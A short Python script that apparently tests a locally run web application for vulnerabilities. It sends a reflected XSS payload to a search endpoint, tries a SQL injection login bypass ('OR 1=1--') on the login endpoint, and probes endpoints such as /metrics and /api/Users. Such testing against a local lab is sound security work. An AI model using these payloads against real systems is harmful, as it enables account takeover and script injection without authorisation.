import urllib.request, json

target = "http://127.0.0.1:3001"

# Test 1: Search endpoint reflection
print("=== 1. Search endpoint reflection test ===")
try:
    url = target + "/rest/products/search?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E"
    r = urllib.request.urlopen(url, timeout=5)
    body = r.read().decode("utf-8", "replace")
    payload = "<script>alert(1)</script>"
    if payload in body:
        print("  XSS REFLECTED in search results! (unencoded)")
    elif payload.replace("<","&lt;").replace(">","&gt;") in body:
        print("  Input reflected but HTML-encoded")
    else:
        print("  Input NOT reflected in response body")
    print("  Status: %d, Content-Type: %s" % (r.status, r.headers.get("Content-Type", "")))
    print("  Preview: %s" % body[:300])
except Exception as e:
    print("  Error: %s" % e)

# Test 2: Login with SQL payload
print()
print("=== 2. Login endpoint (SQL injection test) ===")
try:
    data = json.dumps({"email": "test' OR 1=1--", "password": "test"}).encode()
    req = urllib.request.Request(target + "/rest/user/login", data=data,
                                 headers={"Content-Type": "application/json"})
    resp = urllib.request.urlopen(req, timeout=5)
    print("  Login with SQLi: HTTP %d" % resp.status)
    print("  Response: %s" % resp.read().decode("utf-8","replace")[:300])
except urllib.request.HTTPError as e:
    body = e.read().decode("utf-8","replace")
    print("  HTTP %d: %s" % (e.code, body[:200]))
except Exception as e:
    print("  Error: %s" % e)

# Test 3: Key endpoints
print()
print("=== 3. Key endpoint tests ===")
for path in ["/metrics", "/rest/products/search?q=test", "/rest/user/login", "/api/Users"]:
    try:
        r = urllib.request.urlopen(target + path, timeout=5)
        ct = r.headers.get("Content-Type", "")[:40]
        print("  [%s] HTTP %d, %s" % (path, r.status, ct))
    except urllib.request.HTTPError as e:
        print("  [%s] HTTP %d" % (path, e.code))
    except Exception as e:
        print("  [%s] Error: %s" % (path, e))
